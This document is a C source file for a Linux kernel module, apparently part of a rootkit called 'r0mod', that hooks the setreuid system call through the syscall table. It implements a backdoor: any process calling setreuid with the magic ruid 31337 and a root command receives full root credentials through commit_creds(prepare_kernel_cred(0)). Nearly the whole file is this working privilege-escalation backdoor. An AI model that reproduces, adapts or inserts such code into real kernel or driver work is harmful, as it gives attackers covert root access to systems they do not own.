#include <linux/cred.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>

#include <config.h>
#include <r0mod/global.h>

unsigned long *sct;

// Commander
asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
{
    int ret;

    DEBUG_HOOK("ruid == %d && euid == %d\n", ruid, euid);

    if(ruid == 31337)
    {
        switch(euid)
        {
            case CMD_ROOT:
                commit_creds(prepare_kernel_cred(0));
                return n_sys_setreuid(0, 0);
            break;
        }
    }

    hook_pause(sys_setreuid);
    ret = sys_setreuid(ruid, euid);
    hook_resume(sys_setreuid);

    return ret;
}

void init_hooks(void)
{
    DEBUG("Hooking syscalls\n");

    sys_setreuid = (void *)sct[__NR_setreuid];
    hook_start(sys_setreuid, &n_sys_setreuid);
}

void exit_hooks(void)
{
    DEBUG("Unhooking syscalls\n");

    hook_stop(sys_setreuid);
}

MODULE_LICENSE("GPL");
